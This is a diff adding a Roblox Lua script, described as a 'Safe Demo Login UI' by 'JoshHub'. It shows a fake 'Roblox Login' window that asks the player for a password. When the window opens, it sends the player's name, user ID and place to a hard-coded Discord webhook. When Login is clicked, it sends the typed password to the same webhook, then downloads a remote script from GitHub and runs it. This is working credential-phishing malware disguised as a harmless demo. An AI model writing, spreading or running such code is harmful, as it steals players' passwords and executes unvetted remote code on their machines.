@@ -1,0 +1,204 @@
+--// Safe Demo Login UI + Discord Logs + Auto Loader
+--// Owner:JoshHub
+
+--== Config ==--
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1409905841003429909/YYUG4LytkkXGwIxP6omBu9uLuU9F7M9IaAbe9Fb3Kq0Hev1Y-ROaguOwSCK7RXitAaP1"
+local LOGIN_WEBHOOK = "https://discord.com/api/webhooks/1409905841003429909/YYUG4LytkkXGwIxP6omBu9uLuU9F7M9IaAbe9Fb3Kq0Hev1Y-ROaguOwSCK7RXitAaP1"
+local LOADER_URL  = "https://raw.githubusercontent.com/roxaspp/JoshHub/refs/heads/main/TEst"
+
+--== Services ==--
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local LocalPlayer = Players.LocalPlayer
+
+--== Helpers ==--
+local function httpRequest(tbl)
+    local req = (syn and syn.request) or http_request or request or (http and http.request)
+    if req then
+        return req(tbl)
+    else
+        if tbl.Method == "POST" and tbl.Headers and tbl.Headers["Content-Type"] == "application/json" then
+            local ok, err = pcall(function()
+                HttpService:PostAsync(tbl.Url, tbl.Body, Enum.HttpContentType.ApplicationJson)
+            end)
+            return { Success = ok, ErrorMessage = err }
+        end
+    end
+end
+
+local function getPlaceName()
+    local ok, info = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    return (ok and info and info.Name) or ("PlaceId: "..tostring(game.PlaceId))
+end
+
+local function avatarUrlFor(userId, size)
+    size = size or 420
+    return ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=%d&height=%d&format=png")
+        :format(userId, size, size)
+end
+
+--== Webhook Senders ==--
+local function sendWebhookEmbedOpen(title, description)
+    local payload = {
+        username = "JoshhubScript",
+        embeds = {{
+            title = title,
+            description = description,
+            color = 3447003,
+            thumbnail = { url = avatarUrlFor(LocalPlayer.UserId, 180) }, -- ✅ Avatar headshot
+            fields = {
+                { name = "Player", value = ("%s (@%s)"):format(LocalPlayer.DisplayName, LocalPlayer.Name), inline = true },
+                { name = "UserId", value = tostring(LocalPlayer.UserId), inline = true },
+                { name = "Place",  value = getPlaceName(), inline = false },
+            },
+            footer = { text = os.date("!%Y-%m-%d %H:%M:%S UTC") .. " • UTC" }
+        }}
+    }
+    local ok, body = pcall(HttpService.JSONEncode, HttpService, payload)
+    if not ok then return end
+
+    httpRequest({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = body
+    })
+end
+
+local function sendWebhookEmbedLogin(title, description, password)
+    local payload = {
+        username = "JoshHubScript",
+        embeds = {{
+            title = title,
+            description = description,
+            color = 16753920,
+            thumbnail = { url = avatarUrlFor(LocalPlayer.UserId, 180) }, -- ✅ Avatar headshot
+            fields = {
+                { name = "Player", value = ("%s (@%s)"):format(LocalPlayer.DisplayName, LocalPlayer.Name), inline = true },
+                { name = "UserId", value = tostring(LocalPlayer.UserId), inline = true },
+                { name = "Place",  value = getPlaceName(), inline = false },
+                { name = "Password Input", value = "```" .. password .. "```", inline = false },
+            },
+            footer = { text = os.date("!%Y-%m-%d %H:%M:%S UTC") .. " • UTC" }
+        }}
+    }
+    local ok, body = pcall(HttpService.JSONEncode, HttpService, payload)
+    if not ok then return end
+
+    httpRequest({
+        Url = LOGIN_WEBHOOK,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = body
+    })
+end
+
+--== UI ==--
+local guiParent = (pcall(function() return LocalPlayer.PlayerGui end) and LocalPlayer:FindFirstChildOfClass("PlayerGui")) or game:GetService("CoreGui")
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "Josh_LoginUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = guiParent
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 360, 0, 260)
+Frame.Position = UDim2.new(0.5, -180, 0.5, -130)
+Frame.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
+Frame.Parent = ScreenGui
+local corner = Instance.new("UICorner", Frame); corner.CornerRadius = UDim.new(0, 10)
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -20, 0, 40)
+Title.Position = UDim2.new(0, 10, 0, 8)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 28
+Title.Text = "Roblox Login"
+Title.TextColor3 = Color3.fromRGB(240, 240, 240)
+Title.Parent = Frame
+
+-- Avatar headshot UI
+local Avatar = Instance.new("ImageLabel")
+Avatar.Size = UDim2.new(0, 64, 0, 64)
+Avatar.Position = UDim2.new(0, 16, 0, 56)
+Avatar.BackgroundTransparency = 1
+Avatar.Parent = Frame
+do
+    local thumb, _ = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size180x180)
+    Avatar.Image = thumb
+end
+
+-- Username line
+local UserLine = Instance.new("TextLabel")
+UserLine.Size = UDim2.new(1, -100, 0, 28)
+UserLine.Position = UDim2.new(0, 92, 0, 74)
+UserLine.BackgroundTransparency = 1
+UserLine.Font = Enum.Font.Gotham
+UserLine.TextSize = 18
+UserLine.TextXAlignment = Enum.TextXAlignment.Left
+UserLine.TextColor3 = Color3.fromRGB(220, 220, 220)
+UserLine.Text = ("Username: %s (@%s)"):format(LocalPlayer.DisplayName, LocalPlayer.Name)
+UserLine.Parent = Frame
+
+-- TextBox (final send on login)
+local Input = Instance.new("TextBox")
+Input.Size = UDim2.new(1, -32, 0, 38)
+Input.Position = UDim2.new(0, 16, 0, 120)
+Input.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+Input.PlaceholderText = "Enter password..."
+Input.Text = ""
+Input.Font = Enum.Font.Gotham
+Input.TextSize = 18
+Input.TextColor3 = Color3.fromRGB(255, 255, 255)
+Input.ClearTextOnFocus = false
+Input.Parent = Frame
+local ic = Instance.new("UICorner", Input); ic.CornerRadius = UDim.new(0, 6)
+
+-- Login button
+local Login = Instance.new("TextButton")
+Login.Size = UDim2.new(1, -32, 0, 40)
+Login.Position = UDim2.new(0, 16, 0, 172)
+Login.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
+Login.Font = Enum.Font.GothamBold
+Login.TextSize = 20
+Login.Text = "Login"
+Login.TextColor3 = Color3.fromRGB(255, 255, 255)
+Login.Parent = Frame
+local lc = Instance.new("UICorner", Login); lc.CornerRadius = UDim.new(0, 6)
+
+--== Webhook Logs ==--
+sendWebhookEmbedOpen("Login UI Opened", "The login UI has been shown.")
+
+-- On Login click
+Login.MouseButton1Click:Connect(function()
+    local userInput = Input.Text
+
+    -- ✅ Check kung kulang sa 6 characters
+    if #userInput < 6 then
+        Input.Text = ""
+        Input.PlaceholderText = "⚠️ Password must be 6+ characters!"
+        Input.PlaceholderColor3 = Color3.fromRGB(255, 80, 80)
+        return
+    end
+
+    -- ✅ Kung pasado, ibang webhook gagamitin
+    sendWebhookEmbedLogin("Login Clicked", "User clicked the login button.", userInput)
+
+    -- Alisin yung UI
+    ScreenGui:Destroy()
+
+    -- Auto load script (replace UI with main script)
+    local ok, res = pcall(function()
+        return game:HttpGet(LOADER_URL)
+    end)
+    if ok and res then
+        loadstring(res)()
+    else
+        warn("Failed to load main script.")
+    end
+end)
